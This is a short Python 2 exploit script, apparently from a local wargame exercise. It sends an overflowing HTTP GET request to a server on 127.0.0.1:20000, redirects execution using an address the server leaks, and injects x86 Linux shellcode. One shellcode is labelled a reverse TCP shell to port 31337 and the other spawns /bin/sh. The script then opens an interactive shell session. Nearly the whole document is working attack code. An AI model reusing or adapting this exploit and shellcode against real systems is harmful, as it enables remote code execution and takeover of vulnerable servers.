import struct
import socket
import telnetlib

# reverse tcp shell to 127.0.0.1:31337
shell = "\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5d\xbe\x80\xff\xff\xfe\xf7\xd6\x56\x66\xbd\x69\x7a\x0f\xcd\x09\xdd\x55\x43\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x87\xd9\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xdf"

# execve
shell = "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

def create(address):
	request = "GET "
	version = " HTTP/1.1"
	path = "A"*(128 + 12 - 1) # -1 for alignment because realpath prepends "/" to the buffer

	offset = len(request + path + version) + 4
	path += struct.pack("I", address + offset)

	payload = request + path + version
	payload += shell
	payload += "B"*(1024 - len(payload))

	return payload	

HOST = "127.0.0.1"
PORT = 20000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

data = s.recv(1024)
address = int(data[21:31], 16)
payload = create(address)

print "Sending payload: " + payload
s.send(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
